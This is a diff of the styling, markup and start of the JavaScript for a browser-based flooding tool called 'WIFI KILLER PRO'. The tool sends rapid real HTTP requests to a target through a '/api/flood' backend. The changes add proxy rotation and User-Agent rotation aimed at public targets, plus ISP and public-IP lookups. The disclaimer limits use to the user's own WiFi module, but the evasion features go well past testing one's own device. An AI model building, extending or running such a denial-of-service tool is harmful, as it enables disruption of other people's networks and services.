@@ -913,292 +808,273 @@ body::after {
   color: var(--accent-violet);
   font-family: 'Orbitron', sans-serif;
   font-weight: 700;
-  letter-spacing: 1.5px;
-  font-size: 13px;
-  animation: blink 1.2s ease-in-out infinite;
+  letter-spacing: 1.2px;
+  font-size: 12px;
 }
 
-/* =================================================================
-   CSS SECTION 15 — CONSOLE LOG
-   ================================================================= */
-.console-card {
-  padding: 0;
-  overflow: hidden;
-}
+/* ============================================================================
+   16. CONSOLE LOG
+   ============================================================================ */
+.console-card { padding: 0; overflow: hidden; }
 
 .console-header {
   display: flex;
   align-items: center;
   justify-content: space-between;
-  padding: 14px 18px;
-  border-bottom: 1px solid rgba(224, 64, 251, 0.22);
-  background: rgba(0, 0, 0, 0.35);
+  padding: 13px 16px;
+  border-bottom: 1px solid rgba(224, 64, 251, 0.20);
+  background: rgba(0, 0, 0, 0.30);
 }
 
 .console-title {
   font-family: 'Orbitron', sans-serif;
   font-weight: 700;
-  font-size: 13px;
-  letter-spacing: 1.8px;
+  font-size: 12px;
+  letter-spacing: 1.5px;
   color: var(--accent-violet);
   display: flex;
   align-items: center;
-  gap: 10px;
+  gap: 8px;
 }
 
-.console-title i {
-  font-size: 14px;
-}
+.console-title i { font-size: 13px; }
 
 .console-dot {
   width: 8px;
   height: 8px;
   border-radius: 50%;
   background: var(--accent-violet);
-  box-shadow: 0 0 10px var(--accent-violet);
-  animation: blink 1.5s ease-in-out infinite;
+  box-shadow: 0 0 8px var(--accent-violet);
 }
 
 .console-dot.active {
   background: var(--accent-pink);
-  box-shadow: 0 0 10px var(--accent-pink);
+  box-shadow: 0 0 8px var(--accent-pink);
+  animation: blink 1.2s ease-in-out infinite;
 }
 
-.console-actions {
-  display: flex;
-  gap: 8px;
-}
+@keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+.console-actions { display: flex; gap: 6px; }
 
 .console-btn {
   background: transparent;
-  border: 1px solid rgba(224, 64, 251, 0.35);
+  border: 1px solid rgba(224, 64, 251, 0.30);
   color: var(--accent-pink);
-  padding: 5px 12px;
+  padding: 5px 10px;
   border-radius: var(--radius-sm);
   font-family: 'Orbitron', sans-serif;
-  font-size: 10px;
+  font-size: 9px;
   font-weight: 700;
   cursor: pointer;
-  letter-spacing: 1px;
-  transition: all var(--t-base);
+  letter-spacing: 0.8px;
+  transition: background var(--t-base), border-color var(--t-base);
   display: inline-flex;
   align-items: center;
-  gap: 5px;
+  gap: 4px;
 }
 
-.console-btn:hover {
-  background: rgba(224, 64, 251, 0.18);
-  border-color: var(--accent-violet);
-  color: var(--accent-violet);
-}
-
+.console-btn:hover { background: rgba(224, 64, 251, 0.16); border-color: var(--accent-violet); color: var(--accent-violet); }
 .console-btn:active { transform: scale(0.94); }
-
 .console-btn i { font-size: 9px; }
 
 .console-body {
-  height: 280px;
+  height: 260px;
   overflow-y: auto;
-  padding: 12px 14px;
-  background: rgba(0, 0, 0, 0.55);
+  padding: 10px 12px;
+  background: rgba(0, 0, 0, 0.50);
   font-family: 'JetBrains Mono', monospace;
-  font-size: 11.5px;
-  line-height: 1.65;
-  scroll-behavior: smooth;
+  font-size: 11px;
+  line-height: 1.6;
   -webkit-overflow-scrolling: touch;
+  overscroll-behavior: contain;
+  will-change: scroll-position;
 }
 
-.console-body::-webkit-scrollbar { width: 6px; }
-.console-body::-webkit-scrollbar-track { background: rgba(224, 64, 251, 0.06); }
+.console-body::-webkit-scrollbar { width: 5px; }
+.console-body::-webkit-scrollbar-track { background: rgba(224, 64, 251, 0.05); }
 .console-body::-webkit-scrollbar-thumb {
   background: linear-gradient(180deg, #ff1744, #e040fb);
   border-radius: 3px;
 }
-.console-body::-webkit-scrollbar-thumb:hover {
-  background: linear-gradient(180deg, #ff4081, #7c4dff);
-}
 
 .log-line {
-  margin-bottom: 3px;
+  margin-bottom: 2px;
   display: flex;
-  gap: 8px;
+  gap: 7px;
   word-break: break-word;
-  animation: logSlide 0.18s ease-out;
 }
 
-@keyframes logSlide {
-  from { opacity: 0; transform: translateX(-8px); }
-  to   { opacity: 1; transform: translateX(0); }
-}
-
-.log-time {
-  color: rgba(224, 64, 251, 0.55);
-  flex-shrink: 0;
-  font-size: 10.5px;
-}
-
-.log-level {
-  font-weight: 700;
-  flex-shrink: 0;
-  min-width: 64px;
-  font-size: 10.5px;
-}
+.log-time { color: rgba(224, 64, 251, 0.50); flex-shrink: 0; font-size: 10px; }
+.log-level { font-weight: 700; flex-shrink: 0; min-width: 60px; font-size: 10px; }
 
 .log-level.INFO    { color: #64b5f6; }
 .log-level.SUCCESS { color: #69f0ae; }
 .log-level.WARN    { color: #ffab40; }
 .log-level.ERROR   { color: #ff5252; }
-.log-level.ATTACK  {
-  color: var(--accent-pink);
-  text-shadow: 0 0 8px rgba(255, 64, 129, 0.7);
-}
-.log-level.PROXY   { color: #b388ff; text-shadow: 0 0 8px rgba(124, 77, 255, 0.7); }
+.log-level.ATTACK  { color: var(--accent-pink); text-shadow: 0 0 6px rgba(255, 64, 129, 0.6); }
+.log-level.PROXY   { color: #b388ff; text-shadow: 0 0 6px rgba(124, 77, 255, 0.6); }
+.log-level.ISP     { color: #ff80ab; }
 
-.log-text {
-  color: var(--text-secondary);
-  flex: 1;
-  min-width: 0;
-}
+.log-text { color: var(--text-secondary); flex: 1; min-width: 0; }
 
 .console-stats {
   display: flex;
   justify-content: space-between;
-  padding: 11px 18px;
-  border-top: 1px solid rgba(224, 64, 251, 0.18);
+  padding: 10px 16px;
+  border-top: 1px solid rgba(224, 64, 251, 0.16);
   font-family: 'JetBrains Mono', monospace;
-  font-size: 11px;
+  font-size: 10.5px;
   color: var(--text-muted);
-  letter-spacing: 0.5px;
-  background: rgba(0, 0, 0, 0.35);
-  gap: 12px;
+  letter-spacing: 0.4px;
+  background: rgba(0, 0, 0, 0.30);
+  gap: 10px;
   flex-wrap: wrap;
 }
 
-.stat-item {
+.stat-item { display: flex; align-items: center; gap: 5px; }
+.stat-item i { font-size: 10px; }
+.stat-value { color: var(--accent-violet); font-weight: 700; }
+.stat-value.active { color: var(--accent-pink); text-shadow: 0 0 6px rgba(255, 64, 129, 0.6); }
+.stat-value.success { color: #69f0ae; }
+
+/* ============================================================================
+   17. PROXY/UA CARD
+   ============================================================================ */
+.proxy-card { padding: 16px 18px; }
+
+.proxy-stats {
   display: flex;
-  align-items: center;
-  gap: 6px;
+  gap: 10px;
+  flex-wrap: wrap;
 }
 
-.stat-value {
-  color: var(--accent-violet);
-  font-weight: 700;
-}
-
-.stat-value.active {
-  color: var(--accent-pink);
-  text-shadow: 0 0 8px rgba(255, 64, 129, 0.7);
-  animation: blink 1.2s ease-in-out infinite;
-}
-
-.stat-value.success {
-  color: #69f0ae;
-}
-
-/* =================================================================
-   CSS SECTION 16 — FOOTER
-   ================================================================= */
-.footer-card {
-  padding: 14px 16px;
-}
-
-.footer-content {
+.proxy-stat {
+  flex: 1;
+  min-width: 140px;
+  padding: 10px 12px;
+  background: rgba(255, 255, 255, 0.035);
+  border: 1px solid rgba(224, 64, 251, 0.18);
+  border-radius: var(--radius-md);
   display: flex;
   align-items: center;
   gap: 10px;
 }
 
-.footer-icon {
-  font-size: 16px;
-  color: var(--accent-violet);
+.proxy-stat-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 8px;
+  background: rgba(224, 64, 251, 0.12);
+  border: 1px solid rgba(224, 64, 251, 0.30);
+  display: flex;
+  align-items: center;
+  justify-content: center;
   flex-shrink: 0;
 }
 
+.proxy-stat-icon i {
+  font-size: 14px;
+  color: var(--accent-violet);
+}
+
+.proxy-stat-info { flex: 1; min-width: 0; }
+
+.proxy-stat-label {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 9px;
+  font-weight: 700;
+  color: var(--text-muted);
+  letter-spacing: 0.8px;
+  text-transform: uppercase;
+}
+
+.proxy-stat-value {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--text-primary);
+}
+
+.proxy-stat-value.ok { color: #69f0ae; }
+.proxy-stat-value.empty { color: var(--text-muted); }
+
+/* ============================================================================
+   18. FOOTER
+   ============================================================================ */
+.footer-card { padding: 14px 16px; }
+.footer-content { display: flex; align-items: center; gap: 10px; }
+.footer-icon { font-size: 16px; color: var(--accent-violet); flex-shrink: 0; }
 .footer-text {
   color: var(--text-secondary);
-  font-size: 12px;
+  font-size: 11.5px;
   line-height: 1.55;
   font-weight: 500;
-  font-family: 'Rajdhani', sans-serif;
 }
+.footer-text strong { color: var(--accent-pink); font-weight: 700; }
 
-.footer-text strong {
-  color: var(--accent-pink);
-  font-weight: 700;
-}
-
-/* =================================================================
-   CSS SECTION 17 — MODAL
-   ================================================================= */
+/* ============================================================================
+   19. MODAL
+   ============================================================================ */
 .modal-overlay {
   position: fixed;
   inset: 0;
-  background: var(--overlay-bg);
-  backdrop-filter: blur(15px);
-  -webkit-backdrop-filter: blur(15px);
+  background: rgba(0, 0, 0, 0.78);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
   display: none;
   align-items: center;
   justify-content: center;
   z-index: 1000;
-  padding: 24px;
+  padding: 20px;
 }
 
-.modal-overlay.active {
-  display: flex;
-  animation: fadeIn 0.22s ease-out;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; }
-  to   { opacity: 1; }
-}
+.modal-overlay.active { display: flex; }
 
 .modal-box {
   background: var(--grad-card);
   border: 1.5px solid var(--border-glow);
   border-radius: var(--radius-2xl);
-  padding: 26px 22px;
+  padding: 24px 20px;
   max-width: 420px;
   width: 100%;
-  box-shadow: var(--shadow-modal);
-  animation: modalPop 0.32s cubic-bezier(0.18, 0.9, 0.32, 1.28);
+  box-shadow: 0 0 40px rgba(224, 64, 251, 0.30), 0 20px 50px rgba(0, 0, 0, 0.5);
+  animation: modalPop 0.28s cubic-bezier(0.18, 0.9, 0.32, 1.2);
 }
 
 @keyframes modalPop {
-  from { transform: scale(0.88); opacity: 0; }
+  from { transform: scale(0.90); opacity: 0; }
   to   { transform: scale(1); opacity: 1; }
 }
 
 .modal-title {
   font-family: 'Orbitron', sans-serif;
-  font-size: 18px;
+  font-size: 17px;
   font-weight: 900;
   color: var(--accent-pink);
-  margin-bottom: 14px;
-  letter-spacing: 1.2px;
-  text-shadow: 0 0 12px rgba(255, 64, 129, 0.5);
+  margin-bottom: 12px;
+  letter-spacing: 1px;
   display: flex;
   align-items: center;
   gap: 10px;
 }
 
-.modal-title i {
-  font-size: 18px;
-}
+.modal-title i { font-size: 17px; }
 
 .modal-message {
   color: var(--text-secondary);
-  font-size: 14px;
+  font-size: 13.5px;
   line-height: 1.65;
-  margin-bottom: 22px;
+  margin-bottom: 20px;
   white-space: pre-wrap;
-  font-family: 'Rajdhani', sans-serif;
   font-weight: 500;
+  max-height: 300px;
+  overflow-y: auto;
 }
 
 .modal-btn {
   width: 100%;
-  padding: 13px;
+  padding: 12px;
   background: var(--grad-btn-attack);
   background-size: 200% auto;
   border: none;
@@ -1207,22 +1083,18 @@ body::after {
   font-family: 'Orbitron', sans-serif;
   font-weight: 700;
   letter-spacing: 1.2px;
-  font-size: 14px;
+  font-size: 13px;
   cursor: pointer;
-  transition: all var(--t-base);
-  box-shadow: 0 6px 20px rgba(255, 23, 68, 0.35);
+  transition: transform var(--t-fast), background-position var(--t-base);
+  box-shadow: 0 4px 16px rgba(255, 23, 68, 0.30);
 }
 
-.modal-btn:hover {
-  background-position: right center;
-  transform: translateY(-1px);
-}
-
+.modal-btn:hover { background-position: right center; }
 .modal-btn:active { transform: scale(0.97); }
 
-/* =================================================================
-   CSS SECTION 18 — TOAST NOTIFICATION
-   ================================================================= */
+/* ============================================================================
+   20. TOAST
+   ============================================================================ */
 .toast-container {
   position: fixed;
   top: 16px;
@@ -1238,82 +1110,59 @@ body::after {
 }
 
 .toast {
-  padding: 12px 18px;
+  padding: 11px 16px;
   border-radius: var(--radius-md);
-  background: var(--grad-card);
+  background: var(--card-bg-solid);
   border: 1.5px solid var(--border-glow);
   color: var(--text-primary);
-  font-family: 'Rajdhani', sans-serif;
-  font-size: 13px;
+  font-size: 12.5px;
   font-weight: 600;
-  box-shadow: 0 8px 24px rgba(224, 64, 251, 0.25);
+  box-shadow: 0 6px 20px rgba(224, 64, 251, 0.20);
   display: flex;
   align-items: center;
   gap: 10px;
-  animation: toastIn 0.3s ease-out;
   pointer-events: auto;
+  animation: toastIn 0.25s ease-out;
 }
 
-.toast i { font-size: 15px; }
-
+.toast i { font-size: 14px; }
 .toast.success { border-color: rgba(105, 240, 174, 0.5); }
 .toast.success i { color: #69f0ae; }
-
 .toast.error { border-color: rgba(255, 82, 82, 0.5); }
 .toast.error i { color: #ff5252; }
-
 .toast.warn { border-color: rgba(255, 171, 64, 0.5); }
 .toast.warn i { color: #ffab40; }
-
 .toast.info { border-color: rgba(100, 181, 246, 0.5); }
 .toast.info i { color: #64b5f6; }
 
 @keyframes toastIn {
-  from { opacity: 0; transform: translateY(-20px); }
+  from { opacity: 0; transform: translateY(-16px); }
   to   { opacity: 1; transform: translateY(0); }
 }
 
-.toast.hiding {
-  animation: toastOut 0.3s ease-in forwards;
-}
+.toast.hiding { animation: toastOut 0.25s ease-in forwards; }
+@keyframes toastOut { to { opacity: 0; transform: translateY(-16px); } }
 
-@keyframes toastOut {
-  to { opacity: 0; transform: translateY(-20px); }
-}
-
-/* =================================================================
-   CSS SECTION 19 — UTILITIES
-   ================================================================= */
-.hidden { display: none !important; }
-
-.text-gradient {
-  background: var(--grad-main);
-  -webkit-background-clip: text;
-  background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
-
-.mono { font-family: 'JetBrains Mono', monospace; }
-
-/* =================================================================
-   CSS SECTION 20 — RESPONSIVE
-   ================================================================= */
+/* ============================================================================
+   21. RESPONSIVE
+   ============================================================================ */
 @media (max-width: 480px) {
   body { padding: 12px; }
   .app-container { gap: 12px; }
-  .title { font-size: 21px; letter-spacing: 2px; }
+  .title { font-size: 20px; letter-spacing: 1.8px; }
   .header-icon-wrap { width: 38px; height: 38px; }
   .header-icon-wrap i { font-size: 18px; }
-  .section-title { font-size: 13px; }
-  .section-header i { font-size: 16px; }
-  .info-label, .perm-label { font-size: 10px; }
-  .info-value { font-size: 11.5px; }
-  .console-body { height: 240px; font-size: 11px; }
+  .section-title { font-size: 12.5px; }
+  .section-header > i { font-size: 15px; }
+  .info-label, .perm-label { font-size: 9.5px; }
+  .info-value { font-size: 11px; }
+  .console-body { height: 220px; font-size: 10.5px; }
   .attack-btn { font-size: 14px; padding: 16px 18px; letter-spacing: 1.4px; }
   .glass-card { padding: 16px; border-radius: var(--radius-lg); }
-  .console-stats { font-size: 10px; padding: 9px 14px; }
-  .console-header { padding: 12px 14px; }
+  .console-stats { font-size: 10px; padding: 9px 12px; }
+  .console-header { padding: 11px 12px; }
   .config-input, .config-select { font-size: 12px; padding: 9px 12px; }
+  .proxy-stat-value { font-size: 13px; }
 }
 
 @media (min-width: 720px) {
@@ -1321,7 +1170,6 @@ body::after {
   .app-container { gap: 16px; }
 }
 
-/* Reduce motion for accessibility */
 @media (prefers-reduced-motion: reduce) {
   *, *::before, *::after {
     animation-duration: 0.01ms !important;
@@ -1330,23 +1178,17 @@ body::after {
     scroll-behavior: auto !important;
   }
 }
+
+.hidden { display: none !important; }
 </style>
 </head>
 <body>
 
-<!-- =============================================================
-     TOAST CONTAINER
-     ============================================================= -->
 <div class="toast-container" id="toastContainer"></div>
 
-<!-- =============================================================
-     APP CONTAINER
-     ============================================================= -->
 <div class="app-container">
 
-  <!-- ===========================================================
-       HEADER
-       =========================================================== -->
+  <!-- HEADER -->
   <div class="glass-card header-card reveal">
     <div class="header-content">
       <div class="header-icon-wrap">
@@ -1355,13 +1197,12 @@ body::after {
       <div>
         <h1 class="title">WIFI KILLER PRO</h1>
         <p class="subtitle">Real Network Stress Tester</p>
+        <span class="version-badge">v3.0.0</span>
       </div>
     </div>
   </div>
 
-  <!-- ===========================================================
-       WARNING
-       =========================================================== -->
+  <!-- WARNING -->
   <div class="glass-card warning-card reveal reveal-delay-1">
     <div class="section-header">
       <i class="fas fa-triangle-exclamation"></i>
@@ -1369,19 +1210,16 @@ body::after {
       <span class="section-badge error">REAL ATTACK</span>
     </div>
     <p class="warning-text">
-      Tool ini mengirim <strong>HTTP request nyata</strong> ke target WiFi/modul milik Anda sendiri.
-      Setiap paket yang tercatat di console adalah request yang benar-benar sampai ke target
-      (bisa diverifikasi di log server modul Anda). <strong>Bukan simulasi.</strong><br><br>
-      Gunakan <strong>hanya untuk testing modul WiFi sendiri</strong>. Penyalahgunaan
-      terhadap jaringan orang lain adalah ilegal dan menjadi tanggung jawab pengguna.
-      Browser tidak dapat mengakses <code>raw UDP socket</code>, jadi yang dikirim adalah
+      Tool ini mengirim <strong>HTTP request nyata</strong> ke target WiFi/modul milik Anda.
+      Setiap paket yang tercatat di console benar-benar dikirim ke target dan bisa
+      diverifikasi di log server modul Anda. <strong>Bukan simulasi.</strong><br><br>
+      Gunakan <strong>hanya untuk testing modul WiFi sendiri</strong>. Browser tidak dapat
+      mengakses <code>raw UDP socket</code>, jadi yang dikirim adalah
       <code>HTTP GET</code> via Image/Fetch/WebSocket/Iframe — semuanya <strong>request nyata</strong>.
     </p>
   </div>
 
-  <!-- ===========================================================
-       PERMISSION STATUS
-       =========================================================== -->
+  <!-- PERMISSION -->
   <div class="glass-card reveal reveal-delay-2">
     <div class="section-header">
       <i class="fas fa-shield-halved"></i>
@@ -1395,6 +1233,16 @@ body::after {
         Location
       </span>
       <span class="perm-status unknown" id="permLocationStatus">
+        <i class="fas fa-question"></i> Checking
+      </span>
+    </div>
+
+    <div class="perm-row">
+      <span class="perm-label">
+        <i class="fas fa-tower-broadcast"></i>
+        Local Network
+      </span>
+      <span class="perm-status unknown" id="permLocalNetStatus">
         <i class="fas fa-question"></i> Checking
       </span>
     </div>
@@ -1434,9 +1282,7 @@ body::after {
     </button>
   </div>
 
-  <!-- ===========================================================
-       CONFIG TARGET
-       =========================================================== -->
+  <!-- TARGET CONFIG -->
   <div class="glass-card reveal reveal-delay-2">
     <div class="section-header">
       <i class="fas fa-bullseye"></i>
@@ -1460,7 +1306,7 @@ body::after {
       </div>
       <div class="config-hint">
         Kosongkan untuk pakai gateway otomatis. Isi manual dengan IP modul WiFi Anda
-        (contoh: <strong>192.168.1.100</strong>) jika berbeda dari gateway.
+        (contoh: <strong>192.168.1.100</strong>) jika berbeda.
       </div>
     </div>
 
@@ -1513,7 +1359,7 @@ body::after {
       <label class="config-toggle" for="backendToggle">
         <span class="config-toggle-label">
           <i class="fas fa-server"></i>
-          Pakai Backend Proxy (Vercel)
+          Pakai Backend Proxy + Rotasi Proxy/UA
         </span>
         <span>
           <input type="checkbox" id="backendToggle">
@@ -1521,16 +1367,52 @@ body::after {
         </span>
       </label>
       <div class="config-hint">
-        Jika aktif, request dikirim dari server Vercel (bukan dari browser).
-        Target harus <strong>public/reachable</strong> dari internet.
-        Untuk modul WiFi lokal (192.168.x.x), biarkan OFF.
+        Jika aktif, request dikirim dari server Vercel dengan rotasi proxy dari
+        <code>proxy.txt</code> + UA dari <code>ua.txt</code>. <strong>Hanya untuk target PUBLIC</strong>
+        (ngrok/Cloudflare). <strong>Jangan pakai untuk IP 192.168.x.x</strong>.
+      </div>
+    </div>
+
+    <div class="proxy-warning" id="proxyWarning">
+      <i class="fas fa-circle-exclamation"></i>
+      <strong>Backend proxy + rotasi proxy tidak akan bekerja untuk IP privat!</strong>
+      Server Vercel + proxy publik tidak bisa menjangkau <code>192.168.x.x</code>.
+      Toggle backend proxy sudah dimatikan otomatis.
+    </div>
+  </div>
+
+  <!-- PROXY/UA STATUS -->
+  <div class="glass-card proxy-card reveal reveal-delay-2">
+    <div class="section-header">
+      <i class="fas fa-layer-group"></i>
+      <span class="section-title">Proxy & UA Pool</span>
+      <button class="refresh-btn" id="refreshPoolBtn" title="Reload pool">
+        <i class="fas fa-rotate"></i> RELOAD
+      </button>
+    </div>
+    <div class="proxy-stats">
+      <div class="proxy-stat">
+        <div class="proxy-stat-icon">
+          <i class="fas fa-server"></i>
+        </div>
+        <div class="proxy-stat-info">
+          <div class="proxy-stat-label">Proxies (proxy.txt)</div>
+          <div class="proxy-stat-value empty" id="proxyCount">—</div>
+        </div>
+      </div>
+      <div class="proxy-stat">
+        <div class="proxy-stat-icon">
+          <i class="fas fa-user-secret"></i>
+        </div>
+        <div class="proxy-stat-info">
+          <div class="proxy-stat-label">User Agents (ua.txt)</div>
+          <div class="proxy-stat-value empty" id="uaCount">—</div>
+        </div>
       </div>
     </div>
   </div>
 
-  <!-- ===========================================================
-       NETWORK INFORMATION
-       =========================================================== -->
+  <!-- NETWORK INFORMATION -->
   <div class="glass-card reveal reveal-delay-3">
     <div class="section-header">
       <i class="fas fa-wifi"></i>
@@ -1540,7 +1422,7 @@ body::after {
       </button>
     </div>
 
-    <!-- SSID sengaja disembunyikan sesuai permintaan -->
+    <!-- LOCAL IP + ISP -->
     <div class="info-row">
       <span class="info-label">
         <i class="fas fa-network-wired"></i>
@@ -1549,12 +1431,38 @@ body::after {
       <span class="info-value loading" id="infoIp">Detecting...</span>
     </div>
 
+    <div class="info-row isp-row">
+      <span class="info-label">
+        <i class="fas fa-building"></i>
+        ISP (Device)
+      </span>
+      <span class="info-value loading" id="infoIspDevice">Detecting...</span>
+    </div>
+
+    <!-- ROUTER IP + ISP -->
     <div class="info-row">
       <span class="info-label">
         <i class="fas fa-router"></i>
         Gateway
       </span>
       <span class="info-value loading" id="infoGateway">Detecting...</span>
+    </div>
+
+    <div class="info-row isp-row">
+      <span class="info-label">
+        <i class="fas fa-tower-cell"></i>
+        ISP (Router)
+      </span>
+      <span class="info-value loading" id="infoIspRouter">Detecting...</span>
+    </div>
+
+    <!-- PUBLIC IP + ACTIVE TARGET -->
+    <div class="info-row">
+      <span class="info-label">
+        <i class="fas fa-globe"></i>
+        Public IP
+      </span>
+      <span class="info-value loading" id="infoPublicIp">Detecting...</span>
     </div>
 
     <div class="info-row">
@@ -1590,9 +1498,7 @@ body::after {
     </div>
   </div>
 
-  <!-- ===========================================================
-       ATTACK BUTTON
-       =========================================================== -->
+  <!-- ATTACK BUTTON -->
   <button class="attack-btn reveal reveal-delay-3" id="attackBtn" type="button">
     <span class="btn-icon-wrap">
       <i class="fas fa-skull-crossbones btn-icon btn-icon-start"></i>
@@ -1601,17 +1507,13 @@ body::after {
     <span class="btn-text" id="attackBtnText">START KILL</span>
   </button>
 
-  <!-- ===========================================================
-       PROGRESS
-       =========================================================== -->
+  <!-- PROGRESS -->
   <div class="progress-box reveal reveal-delay-3" id="progressBox">
     <div class="spinner"></div>
     <div class="progress-text" id="progressText">ATTACK IN PROGRESS...</div>
   </div>
 
-  <!-- ===========================================================
-       CONSOLE LOG
-       =========================================================== -->
+  <!-- CONSOLE LOG -->
   <div class="glass-card console-card reveal reveal-delay-4">
     <div class="console-header">
       <div class="console-title">
@@ -1645,9 +1547,7 @@ body::after {
     </div>
   </div>
 
-  <!-- ===========================================================
-       FOOTER
-       =========================================================== -->
+  <!-- FOOTER -->
   <div class="glass-card footer-card reveal reveal-delay-4">
     <div class="footer-content">
       <i class="fas fa-circle-info footer-icon"></i>
@@ -1660,9 +1560,7 @@ body::after {
 
 </div>
 
-<!-- =============================================================
-     MODAL ALERT
-     ============================================================= -->
+<!-- MODAL -->
 <div class="modal-overlay" id="alertModal">
   <div class="modal-box">
     <h2 class="modal-title" id="alertTitle">
@@ -1675,46 +1573,42 @@ body::after {
 </div>
 
 <script>
-/* =================================================================
-   JAVASCRIPT SECTION 1 — WRAPPER
-   ================================================================= */
 (function () {
   'use strict';
 
-  /* =================================================================
-     JAVASCRIPT SECTION 2 — CONSTANTS
-     ================================================================= */
-  var APP_VERSION = '2.0.0';
+  /* ==========================================================================
+     KONSTANTA
+     ========================================================================== */
+  var APP_VERSION = '3.0.0';
   var MAX_LOG_LINES = 300;
   var MAX_STORED_LOG_LINES = 500;
 
   var INTERVAL_MAP = {
-    low:     100,
-    medium:  60,
-    high:    30,
+    low: 100,
+    medium: 60,
+    high: 30,
     extreme: 10
   };
 
   var BACKEND_ENDPOINT = '/api/flood';
 
-  /* =================================================================
-     JAVASCRIPT SECTION 3 — STATE
-     ================================================================= */
+  /* ==========================================================================
+     STATE
+     ========================================================================== */
   var state = {
-    // Network info
     localIp: '-',
     gateway: '-',
+    publicIp: '-',
+    ispDevice: '-',
+    ispRouter: '-',
     connType: '-',
     downlink: '-',
     rtt: '-',
-
-    // Permission
     locationGranted: false,
-    runtimeType: 'detecting', // 'browser' | 'webview'
+    localNetGranted: false,
+    runtimeType: 'detecting',
     bridgeName: null,
     bridgeAvailable: false,
-
-    // Attack
     isKilling: false,
     attackTimer: null,
     attempts: 0,
@@ -1724,71 +1618,72 @@ body::after {
     targetIp: '',
     targetPort: 80,
     useBackend: false,
-
-    // Runtime
-    logBuffer: [],
-    initTime: Date.now()
+    proxyList: [],
+    uaList: [],
+    poolLoaded: false,
+    logBuffer: []
   };
 
-  /* =================================================================
-     JAVASCRIPT SECTION 4 — DOM CACHE
-     ================================================================= */
+  /* ==========================================================================
+     DOM CACHE
+     ========================================================================== */
   var el = {};
 
   function cacheDom() {
-    el.toastContainer   = document.getElementById('toastContainer');
-    el.permSourceBadge  = document.getElementById('permSourceBadge');
+    el.toastContainer     = document.getElementById('toastContainer');
+    el.permSourceBadge    = document.getElementById('permSourceBadge');
     el.permLocationStatus = document.getElementById('permLocationStatus');
-    el.permRuntimeStatus = document.getElementById('permRuntimeStatus');
-    el.permBridgeStatus = document.getElementById('permBridgeStatus');
-    el.permNetworkStatus = document.getElementById('permNetworkStatus');
-    el.recheckPermBtn   = document.getElementById('recheckPermBtn');
-
-    el.targetInput      = document.getElementById('targetInput');
-    el.portInput        = document.getElementById('portInput');
-    el.methodSelect     = document.getElementById('methodSelect');
-    el.intensitySelect  = document.getElementById('intensitySelect');
-    el.backendToggle    = document.getElementById('backendToggle');
-
-    el.refreshNetBtn    = document.getElementById('refreshNetBtn');
-    el.infoIp           = document.getElementById('infoIp');
-    el.infoGateway      = document.getElementById('infoGateway');
-    el.infoTarget       = document.getElementById('infoTarget');
-    el.infoConnType     = document.getElementById('infoConnType');
-    el.infoDownlink     = document.getElementById('infoDownlink');
-    el.infoRtt          = document.getElementById('infoRtt');
-
-    el.attackBtn        = document.getElementById('attackBtn');
-    el.attackBtnText    = document.getElementById('attackBtnText');
-    el.progressBox      = document.getElementById('progressBox');
-    el.progressText     = document.getElementById('progressText');
-
-    el.consoleBody      = document.getElementById('consoleBody');
-    el.consoleDot       = document.getElementById('consoleDot');
-    el.clearLogBtn      = document.getElementById('clearLogBtn');
-    el.copyLogBtn       = document.getElementById('copyLogBtn');
-    el.statAttempts     = document.getElementById('statAttempts');
-    el.statReached      = document.getElementById('statReached');
-    el.statStatus       = document.getElementById('statStatus');
-
-    el.alertModal       = document.getElementById('alertModal');
-    el.alertTitle       = document.getElementById('alertTitle');
-    el.alertMessage     = document.getElementById('alertMessage');
-    el.alertOkBtn       = document.getElementById('alertOkBtn');
+    el.permLocalNetStatus = document.getElementById('permLocalNetStatus');
+    el.permRuntimeStatus  = document.getElementById('permRuntimeStatus');
+    el.permBridgeStatus   = document.getElementById('permBridgeStatus');
+    el.permNetworkStatus  = document.getElementById('permNetworkStatus');
+    el.recheckPermBtn     = document.getElementById('recheckPermBtn');
+    el.targetInput        = document.getElementById('targetInput');
+    el.portInput          = document.getElementById('portInput');
+    el.methodSelect       = document.getElementById('methodSelect');
+    el.intensitySelect    = document.getElementById('intensitySelect');
+    el.backendToggle      = document.getElementById('backendToggle');
+    el.proxyWarning       = document.getElementById('proxyWarning');
+    el.proxyCount         = document.getElementById('proxyCount');
+    el.uaCount            = document.getElementById('uaCount');
+    el.refreshPoolBtn     = document.getElementById('refreshPoolBtn');
+    el.refreshNetBtn      = document.getElementById('refreshNetBtn');
+    el.infoIp             = document.getElementById('infoIp');
+    el.infoGateway        = document.getElementById('infoGateway');
+    el.infoPublicIp       = document.getElementById('infoPublicIp');
+    el.infoIspDevice      = document.getElementById('infoIspDevice');
+    el.infoIspRouter      = document.getElementById('infoIspRouter');
+    el.infoTarget         = document.getElementById('infoTarget');
+    el.infoConnType       = document.getElementById('infoConnType');
+    el.infoDownlink       = document.getElementById('infoDownlink');
+    el.infoRtt            = document.getElementById('infoRtt');
+    el.attackBtn          = document.getElementById('attackBtn');
+    el.attackBtnText      = document.getElementById('attackBtnText');
+    el.progressBox        = document.getElementById('progressBox');
+    el.progressText       = document.getElementById('progressText');
+    el.consoleBody        = document.getElementById('consoleBody');
+    el.consoleDot         = document.getElementById('consoleDot');
+    el.clearLogBtn        = document.getElementById('clearLogBtn');
+    el.copyLogBtn         = document.getElementById('copyLogBtn');
+    el.statAttempts       = document.getElementById('statAttempts');
+    el.statReached        = document.getElementById('statReached');
+    el.statStatus         = document.getElementById('statStatus');
+    el.alertModal         = document.getElementById('alertModal');
+    el.alertTitle         = document.getElementById('alertTitle');
+    el.alertMessage       = document.getElementById('alertMessage');
+    el.alertOkBtn         = document.getElementById('alertOkBtn');
   }
 
-  /* =================================================================
-     JAVASCRIPT SECTION 5 — UTILITIES
-     ================================================================= */
+  /* ==========================================================================
+     UTILITIES
+     ========================================================================== */
   function escapeHtml(text) {
     var div = document.createElement('div');
     div.appendChild(document.createTextNode(String(text)));
     return div.innerHTML;
   }
 
-  function pad2(n) {
-    return n < 10 ? '0' + n : String(n);
-  }
+  function pad2(n) { return n < 10 ? '0' + n : String(n); }
 
   function formatTime(date) {
     var d = date || new Date();
@@ -1797,10 +1692,6 @@ body::after {
 
